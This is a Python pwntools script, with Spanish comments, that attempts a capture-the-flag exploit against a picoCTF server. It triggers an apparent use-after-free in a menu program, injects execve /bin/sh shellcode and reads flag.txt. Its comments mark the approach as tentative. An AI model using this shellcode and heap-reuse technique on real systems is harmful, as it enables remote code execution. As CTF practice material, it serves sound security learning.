#!/usr/bin/env python3
from pwn import *

p = remote('jupiter.challenges.picoctf.org', 9521)

# Nombre inicial
p.recvuntil(b'name?')
p.sendline(b'A' * 100)  # Posible overflow

p.recvuntil(b'>')
p.sendline(b'1')  # Buy
p.recvuntil(b'How much')
p.sendline(b'20')  # Tamaño pequeño

p.recvuntil(b'>')
p.sendline(b'2')  # Eat (free)
p.recvuntil(b'Which')
p.sendline(b'0')

# UAF - el puntero sigue activo
p.recvuntil(b'>')
p.sendline(b'3')  # Reintroduce
p.recvuntil(b'name?')

# Intentar inyectar shellcode o comando
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.send(shellcode + b'\n')

# Comprar de nuevo - reutiliza el chunk con nuestro shellcode
p.recvuntil(b'>')
p.sendline(b'1')
p.recvuntil(b'How much')
p.sendline(b'20')

# Intentar ejecutar
p.sendline(b'ls')
p.sendline(b'cat flag.txt')

# Recibir respuesta
try:
    response = p.recvall(timeout=2)
    if b'pico' in response or b'flag' in response:
        print("[+] FLAG ENCONTRADA!")
        print(response.decode('latin-1'))
except:
    pass

p.close()